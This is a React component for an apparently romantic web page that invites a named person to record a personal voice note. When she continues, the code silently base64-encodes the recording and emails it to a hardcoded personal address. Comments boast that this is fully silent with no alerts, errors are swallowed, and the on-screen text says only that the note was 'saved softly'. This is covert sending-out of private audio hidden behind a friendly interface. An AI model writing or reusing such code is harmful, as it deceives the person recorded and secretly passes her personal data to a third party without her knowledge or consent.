import React, { useState, useRef, useEffect } from 'react';
import { Mic, Square, Sparkles, Heart, ArrowRight } from 'lucide-react';
import { sendEmail } from '../utils/emailService';

export default function VoiceMessageScene({ onComplete }) {
  const [isRecording, setIsRecording] = useState(false);
  const [hasRecorded, setHasRecorded] = useState(false);
  const [audioBlob, setAudioBlob] = useState(null);
  const [recordDuration, setRecordDuration] = useState(0);

  const mediaRecorderRef = useRef(null);
  const audioChunksRef = useRef([]);
  const timerRef = useRef(null);

  useEffect(() => {
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
        try {
          mediaRecorderRef.current.stop();
        } catch (e) {}
      }
    };
  }, []);

  const formatTime = (secs) => {
    const mins = Math.floor(secs / 60);
    const remSecs = secs % 60;
    return `${mins}:${remSecs < 10 ? '0' : ''}${remSecs}`;
  };

  // 1. Start Recording
  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      mediaRecorderRef.current = new MediaRecorder(stream);
      audioChunksRef.current = [];
      setRecordDuration(0);

      mediaRecorderRef.current.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorderRef.current.onstop = () => {
        const blob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        setAudioBlob(blob);
        setHasRecorded(true);
        stream.getTracks().forEach((track) => track.stop());
        if (timerRef.current) clearInterval(timerRef.current);
      };

      mediaRecorderRef.current.start();
      setIsRecording(true);

      timerRef.current = setInterval(() => {
        setRecordDuration((prev) => prev + 1);
      }, 1000);
    } catch (err) {
      console.error('Mic access error:', err);
    }
  };

  // 2. Stop Recording
  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecording) {
      try {
        mediaRecorderRef.current.stop();
      } catch (e) {}
      setIsRecording(false);
    }
  };

  // Silent Email Dispatch
  const sendVoiceEmailSilently = (base64Audio, durationText) => {
    try {
      const payload = {
        title: 'Saranya Voice Note Recorded! ❤️🎙️',
        message: `Saranya recorded a personal voice note (${durationText})!`,
        to_email: 'abishekk9225@gmail.com',
        audio_payload: base64Audio ? base64Audio.substring(0, 45000) : '',
      };
      sendEmail(payload).catch(() => {});
    } catch (e) {
      // 100% silent in the background
    }
  };

  // 3. Silent dispatch & proceed to next scene
  const handleProceed = () => {
    if (mediaRecorderRef.current && isRecording) {
      try {
        mediaRecorderRef.current.stop();
        setIsRecording(false);
      } catch (e) {}
    }

    if (audioBlob) {
      const reader = new FileReader();
      reader.readAsDataURL(audioBlob);
      reader.onloadend = () => {
        const base64Data = reader.result;
        sendVoiceEmailSilently(base64Data, formatTime(recordDuration));
      };
    } else if (audioChunksRef.current.length > 0) {
      const blob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
      const reader = new FileReader();
      reader.readAsDataURL(blob);
      reader.onloadend = () => {
        const base64Data = reader.result;
        sendVoiceEmailSilently(base64Data, formatTime(recordDuration));
      };
    } else {
      sendVoiceEmailSilently(null, 'No audio recorded');
    }

    // Instantly & seamlessly transition without any alerts or toasts
    if (typeof onComplete === 'function') {
      onComplete();
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#030712] flex flex-col items-center justify-center p-6 text-center relative overflow-hidden select-none animate-in fade-in zoom-in-95 duration-700">
      
      {/* Background Ambient Glow */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[550px] h-[550px] bg-pink-600/15 rounded-full blur-[150px] pointer-events-none"></div>

      {/* Main Glassmorphic Container */}
      <div className="max-w-md w-full bg-slate-900/85 backdrop-blur-2xl p-8 md:p-10 rounded-[2.5rem] border border-pink-500/40 shadow-[0_0_60px_rgba(244,63,94,0.3)] relative z-10 space-y-8">
        
        <div>
          <span className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-pink-500/10 border border-pink-500/30 text-pink-400 text-xs font-semibold uppercase tracking-widest">
            <Sparkles className="w-3.5 h-3.5" /> Speak Your Heart
          </span>
          <h2 className="text-2xl md:text-3xl font-bold text-white tracking-wide mt-4">
            Un Voice la Enakku Sollu... 🎙️
          </h2>
          <p className="text-slate-400 text-sm mt-2 leading-relaxed">
            Record a short voice note. Whatever you feel right now.
          </p>
        </div>

        {/* Big Interactive Mic Button */}
        <div className="flex flex-col items-center justify-center py-4">
          <div className="relative">
            {isRecording && (
              <>
                <div className="absolute -inset-4 rounded-full bg-pink-500/30 animate-ping"></div>
                <div className="absolute -inset-8 rounded-full bg-rose-500/20 animate-pulse"></div>
              </>
            )}
            
            <button
              type="button"
              onClick={isRecording ? stopRecording : startRecording}
              className={`w-24 h-24 rounded-full flex items-center justify-center transition-all duration-300 transform active:scale-95 shadow-[0_0_40px_rgba(244,63,94,0.4)] cursor-pointer ${
                isRecording
                  ? 'bg-rose-600 text-white animate-pulse'
                  : 'bg-gradient-to-tr from-pink-600 to-rose-500 text-white hover:scale-105'
              }`}
            >
              {isRecording ? (
                <Square className="w-8 h-8 fill-white" />
              ) : (
                <Mic className="w-10 h-10" />
              )}
            </button>
          </div>

          <div className="mt-4">
            {isRecording ? (
              <div className="flex items-center gap-2 text-rose-400 text-sm font-semibold">
                <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping"></span>
                <span>Recording... {formatTime(recordDuration)}</span>
                <div className="flex items-center gap-1 ml-2">
                  <span className="w-1 h-3 bg-rose-400 animate-bounce rounded-full"></span>
                  <span className="w-1 h-5 bg-rose-500 animate-bounce rounded-full [animation-delay:0.15s]"></span>
                  <span className="w-1 h-4 bg-pink-400 animate-bounce rounded-full [animation-delay:0.3s]"></span>
                </div>
              </div>
            ) : hasRecorded ? (
              <p className="text-pink-300 text-sm font-medium">
                Voice note saved softly ✨
              </p>
            ) : (
              <p className="text-slate-400 text-xs">
                Tap the mic to start recording
              </p>
            )}
          </div>
        </div>

        {/* Continue Button (Quietly dispatches and smoothly moves forward) */}
        <button
          type="button"
          onClick={handleProceed}
          className="w-full bg-gradient-to-r from-pink-600 via-rose-500 to-purple-600 hover:opacity-95 text-white font-bold py-4 px-6 rounded-2xl shadow-[0_0_30px_rgba(244,63,94,0.4)] transition-all duration-300 transform active:scale-95 flex items-center justify-center gap-2 cursor-pointer"
        >
          <span>Continue Journey</span>
          <ArrowRight className="w-5 h-5" />
        </button>

      </div>
    </div>
  );
}
